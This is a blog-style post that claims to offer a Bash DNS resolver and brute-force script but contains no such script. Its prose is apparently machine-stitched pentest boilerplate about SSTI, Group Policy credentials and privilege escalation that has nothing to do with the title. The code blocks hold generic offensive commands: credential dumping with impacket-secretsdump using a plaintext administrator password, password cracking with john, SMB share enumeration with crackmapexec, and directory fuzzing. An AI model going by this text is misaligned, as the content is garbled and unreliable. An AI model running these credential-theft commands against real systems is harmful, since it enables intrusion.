---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "go, fuzzer, script, automation, bash"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-506.html"
URL_IMAGES: ""
Date: "2025-04-28"
Tags: "Go, Fuzzer, Script, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-506"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-506.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `mimikatz`
- `gobuster`
- `impacket`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.100.104.190
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.123.220.144/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.39.154/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
nmap -sCV -p5985,587,587 10.26.57.120 -oN scan.txt
feroxbuster -h
feroxbuster -h
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.46.45.247 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.160.210/FUZZ
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 2.49s
```
